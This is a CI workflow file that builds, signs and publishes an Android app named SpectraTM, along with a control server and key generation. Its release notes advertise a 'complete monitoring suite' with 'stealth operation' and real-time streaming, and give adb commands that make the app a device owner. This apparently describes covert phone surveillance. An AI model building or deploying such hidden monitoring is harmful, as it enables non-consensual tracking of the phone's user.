name: Build SpectraTM APK

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      
    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        distribution: 'temurin'
        java-version: '17'
        
    - name: Cache Gradle packages
      uses: actions/cache@v3
      with:
        path: |
          ~/.gradle/caches
          ~/.gradle/wrapper
        key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
        restore-keys: |
          ${{ runner.os }}-gradle-
          
    - name: Make gradlew executable
      run: chmod +x ./android/gradlew
      
    - name: Build APK
      run: |
        cd android
        ./gradlew assembleRelease --stacktrace
        
    - name: Sign APK (if keystore available)
      if: ${{ env.SIGNING_KEY != '' }}
      run: |
        cd android
        echo "${{ secrets.SIGNING_KEY }}" | base64 -d > release.keystore
        ./gradlew assembleRelease \
          -Pandroid.injected.signing.store.file=release.keystore \
          -Pandroid.injected.signing.store.password="${{ secrets.KEYSTORE_PASSWORD }}" \
          -Pandroid.injected.signing.key.alias="${{ secrets.KEY_ALIAS }}" \
          -Pandroid.injected.signing.key.password="${{ secrets.KEY_PASSWORD }}"
      env:
        SIGNING_KEY: ${{ secrets.SIGNING_KEY }}
        
    - name: Upload APK artifact
      uses: actions/upload-artifact@v4
      with:
        name: spectratm-apk
        path: android/app/build/outputs/apk/release/app-release.apk
        retention-days: 30
        
    - name: Create release on tag
      if: startsWith(github.ref, 'refs/tags/')
      uses: actions/create-release@v1
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      with:
        tag_name: ${{ github.ref_name }}
        release_name: SpectraTM ${{ github.ref_name }}
        body: |
          Automated release for SpectraTM
          
          **Installation:**
          1. Download `spectratm.apk`
          2. Install: `adb install spectratm.apk`
          3. Set device owner: `adb shell dpm set-device-owner com.android.dpc/.DeviceAdminReceiver`
          
          **Features:**
          - Complete monitoring suite
          - Noise_KK encryption
          - Stealth operation
          - Real-time streaming
        draft: false
        prerelease: false
        
    - name: Upload APK to release
      if: startsWith(github.ref, 'refs/tags/')
      uses: actions/upload-release-asset@v1
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      with:
        upload_url: ${{ steps.create_release.outputs.upload_url }}
        asset_path: android/app/build/outputs/apk/release/app-release.apk
        asset_name: spectratm.apk
        asset_content_type: application/vnd.android.package-archive
        
    - name: Build and test server
      run: |
        cd control
        npm ci
        npm test || echo "No tests found, skipping"
        
    - name: Generate encryption keys
      run: |
        cd noise
        npm ci
        npm run keygen
        
    - name: Upload build logs
      if: failure()
      uses: actions/upload-artifact@v4
      with:
        name: build-logs
        path: |
          android/build/reports/
          android/app/build/reports/
        retention-days: 7